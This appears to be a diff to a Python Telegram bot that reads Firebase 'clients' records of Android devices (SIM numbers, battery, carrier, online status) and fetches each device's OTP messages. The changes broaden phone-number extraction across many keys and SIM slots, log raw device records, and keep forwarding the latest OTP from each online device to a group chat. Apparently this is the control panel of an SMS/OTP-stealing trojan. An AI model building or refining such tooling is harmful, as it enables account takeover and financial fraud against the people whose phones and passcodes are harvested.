@@ -391,49 +391,93 @@ async def fetch_otps(url: str, key: str, dev_id: str):
             })
     return otps, last_any_dt
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED resolve_phone() — 40+ keys + sim1-sim5 + nested + deep scan
+# ══════════════════════════════════════════════════════════════════════════════
 def resolve_phone(info: dict, dev_id: str = "") -> str:
     if not isinstance(info, dict): return "—"
-    BAD = {"", "none", "null", "—", "-", "–", "unknown", "n/a", "na", "undefined", "invalid", "no number"}
+    BAD = {"", "none", "null", "—", "-", "–", "unknown", "n/a", "na",
+           "undefined", "invalid", "no number", "0", "false", "true"}
     def _clean(v):
         if v is None: return ""
         s = str(v).strip()
         if s.lower() in BAD: return ""
         return s
 
-    candidates = [
-        info.get("mobNo"), info.get("phoneNumber"), info.get("phone_number"),
-        info.get("PhoneNumber"), info.get("phone"), info.get("mobile"),
-        info.get("Mobile"), info.get("mob"), info.get("number"),
-        info.get("Number"), info.get("msisdn"), info.get("simNumber"),
-        info.get("sim_number"), info.get("contact")
+    candidates = []
+    direct_keys = [
+        "mobNo", "phoneNumber", "phone_number", "PhoneNumber", "phone",
+        "mobile", "Mobile", "mob", "number", "Number", "msisdn",
+        "simNumber", "sim_number", "contact", "phone_no", "Phone",
+        "MOBILE", "mobile_no", "mobileNumber", "contactNo", "contact_no",
+        "userPhone", "user_phone", "userMobile", "user_mobile",
+        "senderNumber", "sender_number", "from", "sender", "address",
+        "devicePhone", "device_phone", "deviceNumber", "device_number",
+        "simNo", "sim_no", "regNumber", "registeredNumber",
     ]
+    for k in direct_keys:
+        candidates.append(info.get(k))
 
-    sims = info.get("sims") or info.get("SIMs") or info.get("sim") or {}
+    for i in range(1, 6):
+        for sim_key in (f"sim{i}", f"SIM{i}", f"Sim{i}", f"sim_{i}", f"sim-{i}"):
+            sv = info.get(sim_key)
+            if isinstance(sv, dict):
+                candidates.extend([
+                    sv.get("number"), sv.get("phone"), sv.get("phoneNumber"),
+                    sv.get("mobNo"), sv.get("mobile"), sv.get("msisdn"),
+                    sv.get("phone_no"), sv.get("mobile_no"), sv.get("mob"),
+                ])
+            elif isinstance(sv, str) and sv.strip():
+                candidates.append(sv)
+
+    sims = info.get("sims") or info.get("SIMs") or info.get("sim") or info.get("Sims") or {}
     if isinstance(sims, dict): sims = list(sims.values())
     if isinstance(sims, list):
         for s in sims:
             if not isinstance(s, dict): continue
-            candidates.extend([s.get("phoneNumber"), s.get("phone"), s.get("number"), s.get("mobNo"), s.get("mobile"), s.get("msisdn")])
+            candidates.extend([
+                s.get("phoneNumber"), s.get("phone"), s.get("number"),
+                s.get("mobNo"), s.get("mobile"), s.get("msisdn"),
+                s.get("phone_no"), s.get("mobile_no"), s.get("mob"),
+                s.get("simNumber"), s.get("sim_number"),
+            ])
 
-    for nest_key in ("device", "info", "data", "details", "meta"):
+    for nest_key in ("device", "info", "data", "details", "meta",
+                     "deviceInfo", "device_info", "simInfo", "sim_info",
+                     "user", "profile", "contactInfo", "contact_info"):
         nest = info.get(nest_key)
         if isinstance(nest, dict):
-            candidates.extend([nest.get("phone"), nest.get("phoneNumber"), nest.get("mobNo"), nest.get("mobile")])
+            candidates.extend([
+                nest.get("phone"), nest.get("phoneNumber"), nest.get("mobNo"),
+                nest.get("mobile"), nest.get("number"), nest.get("msisdn"),
+                nest.get("phone_no"), nest.get("mobile_no"),
+            ])
+            for i in range(1, 5):
+                sv2 = nest.get(f"sim{i}")
+                if isinstance(sv2, dict):
+                    candidates.extend([
+                        sv2.get("number"), sv2.get("phone"), sv2.get("mobNo"),
+                    ])
 
     found_deep = ""
-    def _deep_scan(d):
+    def _deep_scan(d, depth=0):
         nonlocal found_deep
-        if found_deep: return
+        if found_deep or depth > 5: return
         if isinstance(d, dict):
             for k, v in d.items():
-                if "phone" in str(k).lower() or "mob" in str(k).lower() or "number" in str(k).lower():
+                kl = str(k).lower()
+                if any(x in kl for x in ("phone", "mob", "number", "msisdn", "contact", "sim")):
                     s = _clean(v)
-                    if s and s.isdigit() and 10 <= len(s) <= 13:
-                        found_deep = s
-                        return
-                if isinstance(v, (dict, list)): _deep_scan(v)
+                    if s:
+                        digits = re.sub(r"\D", "", s)
+                        if 10 <= len(digits) <= 15:
+                            found_deep = s
+                            return
+                if isinstance(v, (dict, list)):
+                    _deep_scan(v, depth + 1)
         elif isinstance(d, list):
-            for v in d: _deep_scan(v)
+            for v in d:
+                _deep_scan(v, depth + 1)
     _deep_scan(info)
     if found_deep: candidates.append(found_deep)
 
@@ -448,6 +492,9 @@ def resolve_phone(info: dict, dev_id: str = "") -> str:
         return _normalize_phone(dev_id)
     return "—"
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED refresh_firebase() — debug log + name fallback
+# ══════════════════════════════════════════════════════════════════════════════
 async def refresh_firebase(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
     clients = await fb_get(url, "clients", key)
@@ -456,9 +503,17 @@ async def refresh_firebase(cfg: dict):
         return
 
     valid = []
+    no_phone_count = 0
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
         phone = resolve_phone(info, dev_id)
+        if phone == "—" and no_phone_count < 5:
+            no_phone_count += 1
+            logger.warning(
+                f"[{label}] NO PHONE for {dev_id[:10]} | "
+                f"Keys: {list(info.keys())} | "
+                f"Sample: {json.dumps(info, default=str)[:500]}"
+            )
         valid.append((dev_id, info, phone))
 
     async def _fetch_one(dev_id):
@@ -474,7 +529,7 @@ async def refresh_firebase(cfg: dict):
         devs[dev_id] = {
             "online":    fb_status,
             "phone":     phone,
-            "name":      str(info.get("modelName") or info.get("model") or dev_id),
+            "name":      str(info.get("modelName") or info.get("model") or "Unknown Device"),
             "battery":   str(info.get("battery","—")),
             "android":   str(info.get("androidV") or info.get("androidVersion","—")),
             "network":   str(info.get("service_provider") or info.get("provider","—")),
@@ -488,6 +543,9 @@ async def refresh_firebase(cfg: dict):
     fb_last_sync[label]    = now_dt().strftime("%H:%M:%S")
     fb_conn_status[label]  = "ok"
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED refresh_clients_only() — debug log + name fallback
+# ══════════════════════════════════════════════════════════════════════════════
 async def refresh_clients_only(cfg: dict):
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
     clients = await fb_get(url, "clients", key)
@@ -495,15 +553,23 @@ async def refresh_clients_only(cfg: dict):
         fb_conn_status[label] = "error"
         return
     devs = {}
+    no_phone_count = 0
     for dev_id, info in clients.items():
         if not isinstance(info, dict): continue
         phone = resolve_phone(info, dev_id)
+        if phone == "—" and no_phone_count < 5:
+            no_phone_count += 1
+            logger.warning(
+                f"[{label}] NO PHONE (clients_only) {dev_id[:10]} | "
+                f"Keys: {list(info.keys())} | "
+                f"Sample: {json.dumps(info, default=str)[:500]}"
+            )
         fb_status = bool(info.get("status") or info.get("isOnline") or info.get("is_online") or info.get("online"))
         ts_raw    = (info.get("lastSeen") or info.get("last_seen") or info.get("lastOnline") or "")
         devs[dev_id] = {
             "online":    fb_status,
             "phone":     phone,
-            "name":      str(info.get("modelName") or info.get("model") or dev_id),
+            "name":      str(info.get("modelName") or info.get("model") or "Unknown Device"),
             "battery":   str(info.get("battery", "—")),
             "android":   str(info.get("androidV") or info.get("androidVersion", "—")),
             "network":   str(info.get("service_provider") or info.get("provider", "—")),
@@ -733,6 +799,9 @@ def kb_back(page: str = "main_menu") -> InlineKeyboardMarkup:
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh"),
     ]])
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED kb_online() — ID fallback hata diya, sirf number ya "No Number"
+# ══════════════════════════════════════════════════════════════════════════════
 def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     start = page * DEVICES_PER_PAGE
     chunk = devices[start:start+DEVICES_PER_PAGE]
@@ -741,7 +810,7 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
         row = []
         for lb, did, info in chunk[i:i+2]:
             ph = info.get("phone") or "—"
-            ph_short = ph if ph != "—" else f"ID:{did[-6:]}"
+            ph_short = ph if (ph and ph != "—") else "No Number"
             esc  = lb.replace(":","_")
             row.append(InlineKeyboardButton(f"🟢 {ph_short}",
                                             callback_data=f"dev:{esc}:{did}:{page}"))
@@ -2473,6 +2542,9 @@ async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
         return
     logger.error(f"Exception while handling update: {ctx.error}", exc_info=ctx.error)
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED auto_fetch() — phone "—" ho to group alert skip
+# ══════════════════════════════════════════════════════════════════════════════
 async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
     await refresh_all()
     
@@ -2481,6 +2553,10 @@ async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
         for label, devs in device_cache.items():
             for dev_id, info in devs.items():
                 if not info.get("online"): continue
+                # ✅ Number nahi hai to group alert skip karo
+                ph = info.get("phone") or "—"
+                if ph == "—" or not ph.strip():
+                    continue
                 otps = otp_cache.get(label, {}).get(dev_id, [])
                 if otps:
                     latest_otp = otps[0]
@@ -2498,7 +2574,6 @@ async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
                                 )
                             except Exception as ex:
                                 logger.warning(f"Group OTP send fail: {ex}")
-                                # Send error to admin in DM
                                 for admin_id in ADMIN_IDS:
                                     try:
                                         await ctx.bot.send_message(
